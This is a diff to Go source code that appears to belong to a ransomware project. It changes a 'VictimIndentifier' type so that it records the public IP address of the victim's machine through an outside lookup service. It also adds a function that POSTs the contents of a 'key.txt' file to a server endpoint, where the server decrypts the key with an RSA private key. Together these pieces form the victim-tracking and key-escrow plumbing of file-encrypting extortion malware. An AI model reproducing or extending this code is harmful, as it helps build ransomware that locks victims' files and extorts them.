@@ -54,16 +54,44 @@ func (vi *VictimIndentifier) SendToServer(url string) error {
 	return nil
 }
 
-func (vi *VictimIndentifier) GetPublicAPI() (string, error) {
+// GetPublicIP fills the IP field of the victim indentifier with the public api of
+// the victim's machine.
+func (vi *VictimIndentifier) GetPublicIP() error {
 	res, err := http.Get("https://api.ipify.org?format=text")
 	if err != nil {
-		return "", err
+		return err
 	}
 	defer res.Body.Close()
+
 	ip, err := ioutil.ReadAll(res.Body)
 	if err != nil {
-		return "", err
+		return err
 	}
 
-	return string(ip), nil
+	vi.IP = string(ip)
+
+	return nil
+}
+
+// GetKeyFromServer sends the key.txt data to the server and then the server
+// decrypts the data using the rsa private key.
+func GetKeyFromServer(keyFileData []byte) ([]byte, error) {
+	req, err := http.NewRequest("POST", "http://localhost:8080/decrypt_key", bytes.NewBuffer(keyFileData))
+	if err != nil {
+		return nil, err
+	}
+
+	cl := http.Client{}
+	res, err := cl.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer res.Body.Close()
+
+	deckey, err := ioutil.ReadAll(res.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	return deckey, nil
 }
